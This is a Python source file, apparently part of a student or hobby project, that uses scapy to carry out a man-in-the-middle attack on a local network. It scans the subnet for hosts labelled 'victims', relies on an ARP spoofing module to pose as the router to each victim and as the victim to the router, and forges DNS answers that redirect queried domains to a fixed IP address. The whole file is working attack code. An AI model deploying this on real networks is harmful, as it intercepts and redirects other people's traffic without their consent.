import scapy.all as scapy
import threading
import arp_spoofing
import proxy

#currently seems to work on unencrypted requests (eg nike.com, but not https://apple.com)

destination_ip = "142.250.179.174" #what to spoof the ip to (google.com)


dns_looping = True #set this to false to stop the thread

#if packet is dns and has qr=0, it is a query
def isDnsQuery(packet):
    return packet.haslayer(scapy.DNS) and packet.getlayer(scapy.DNS).qr == 0

def isDnsResponse(packet):
    return packet.haslayer(scapy.DNS) and packet.getlayer(scapy.DNS).qr == 1

#todo client doesnt seem to take this as answer even when cut off from internet
def dns_spoof(packet):
    if not isDnsQuery(packet):
        return
    print("dns spoof, victim ip:" + str(packet[scapy.IP].src))

    qname = packet[scapy.DNSQR].qname #get the domain name client wants to resolve

    ip_src = packet[scapy.IP].src
    ip_dst = packet[scapy.IP].dst
    udp_sport = packet[scapy.UDP].sport #udp is default https://www.infoblox.com/dns-security-resource-center/dns-security-faq/is-dns-tcp-or-udp-port-53/
    udp_dport = packet[scapy.UDP].dport
    dns_id = packet[scapy.DNS].id
    dns_qd = packet[scapy.DNS].qd
        
    #dns record with the destination ip as resolved ip
    dns_rr = scapy.DNSRR(rrname=qname, rdata=destination_ip, type='A')

    spoofed_response = scapy.IP(dst=ip_src, src=ip_dst) / \
                    scapy.UDP(dport=udp_sport, sport=udp_dport) / \
                    scapy.DNS(id=dns_id, qr=1, aa=1, rd=packet[scapy.DNS].rd, ra=1, qd=dns_qd,
                              an=dns_rr, ancount=1)


    scapy.send(spoofed_response, verbose=False)
    

def dns_main():
    arp_prep_automated()
    proxy.setup_proxy() #start a proxy and dns spoofing will be handled inside



#Not supposed to be here, we should move later

victim_addresses = {}
router_ip = None
sent_packets_count = 0
current_ip = None
iface = None

def arp_prep_automated(silent = False, iface_ = "enp0s10") :
    global victim_addresses, router_ip, iface, sent_packets_count, current_ip

    iface = iface_
    arp_spoofing.IFACE = iface_

    current_ip = scapy.get_if_addr(iface_)
    arp_spoofing.ATTACKER_MAC = scapy.get_if_hwaddr(iface_)
    
    subnet = current_ip.rsplit('.', 1)[0] #split rightmost number off
    router_ip = subnet + '.1' #usually router is at subnet .1

    for i in range(1,10) :  # ips in subnet, should be (1, 255)
        ip = subnet + "." + str(i)
        try :
            victim_addresses[ip] = arp_spoofing.get_mac(ip) #exists
        except :
            pass #does not exist

    if current_ip in victim_addresses:
        del victim_addresses[current_ip]
    
    
    print("Victims: ", str(victim_addresses))

def arp_tick():
    for victim_ip, victim_mac in victim_addresses.items():
            arp_spoofing.arp_spoof(victim_ip, router_ip) #send to victim that we are router
            arp_spoofing.arp_spoof(router_ip, victim_ip) #send to router that we are victim
